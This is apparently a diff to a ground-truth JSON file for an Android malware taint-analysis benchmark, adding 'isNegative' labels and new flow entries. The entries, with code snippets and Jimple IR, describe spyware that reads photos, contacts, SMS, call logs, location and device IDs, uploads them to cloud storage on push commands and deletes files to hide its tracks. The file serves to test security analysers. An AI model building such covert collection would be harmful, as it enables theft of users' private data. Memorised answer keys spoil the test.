@@ -68,7 +68,8 @@
         "threading": true
       },
       "ID": 1,
-      "description": "This malicious flow reads photos and uploads them to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'photo'."
+      "description": "This malicious flow reads photos and uploads them to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'photo'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -120,7 +121,8 @@
         "threading": true
       },
       "ID": 2,
-      "description": "This malicious flow reads contacts and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'contact'."
+      "description": "This malicious flow reads contacts and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'contact'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -169,7 +171,8 @@
       ],
       "attributes": {},
       "ID": 3,
-      "description": "This malicious flow reads call log and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'call_log'."
+      "description": "This malicious flow reads call log and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'call_log'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -220,7 +223,8 @@
         "appendToString": true
       },
       "ID": 4,
-      "description": "This malicious flow reads sms messages and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_message'."
+      "description": "This malicious flow reads sms messages and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_message'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -278,7 +282,8 @@
         "appendToString": true
       },
       "ID": 5,
-      "description": "This malicious flow reads location information and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'location'."
+      "description": "This malicious flow reads location information and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'location'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -322,7 +327,8 @@
         "appendToString": true
       },
       "ID": 6,
-      "description": "This malicious flow reads device Id and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'."
+      "description": "This malicious flow reads device Id and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -364,7 +370,8 @@
       ],
       "attributes": {},
       "ID": 7,
-      "description": "This malicious flow reads device Id and uploads it to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'."
+      "description": "This malicious flow reads device Id and uploads it to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -415,7 +422,8 @@
         "appendToString": true
       },
       "ID": 8,
-      "description": "This malicious flow reads file list and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'list_file'."
+      "description": "This malicious flow reads file list and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'list_file'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -459,7 +467,8 @@
         "appendToString": true
       },
       "ID": 9,
-      "description": "This malicious flow uploads files. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_file'."
+      "description": "This malicious flow uploads files. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_file'.",
+      "isNegative": false
     },
     {
       "source": {
@@ -493,7 +502,191 @@
       "intermediateFlows": [],
       "attributes": {},
       "ID": 10,
-      "description": "This malicious flow delete file. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'delete_file'."
+      "description": "This malicious flow delete file. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'delete_file'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void getIt(String filePath, Context context)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 72,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 11
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "File file = new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + filename);",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 458,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r3.<java.io.File: void <init>(java.lang.String)>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "InputStream fileContent = new FileInputStream(file);",
+          "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 459,
+          "ID": 1
+        }
+      ],
+      "isNegative": false,
+      "description": "This malicious flow uploads files to a remote server.",
+      "attributes": {},
+      "ID": 12
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void listFileByPath(Context context, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 147,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = virtualinvoke $r9.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 13
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void uploadFileByPath(Context context, String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 119,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"/\" + \"UploadFile\" + \"/\" + filePath, fileContent, objectMetadata)).getResult();",
+        "methodName": "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 139,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 14
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + path).delete();",
+        "methodName": "public static void deletTempFile(String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 470,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r1.<java.io.File: void <init>(java.lang.String)>($r0)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "delete",
+        "targetNo": 1,
+        "statement": "new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + path).delete();",
+        "methodName": "public static void deletTempFile(String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 470,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<java.io.File: boolean delete()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "This malicious flow deletes files to cover up the malicious behaviors. ",
+      "isNegative": false,
+      "attributes": {},
+      "ID": 15
     }
   ]
 }
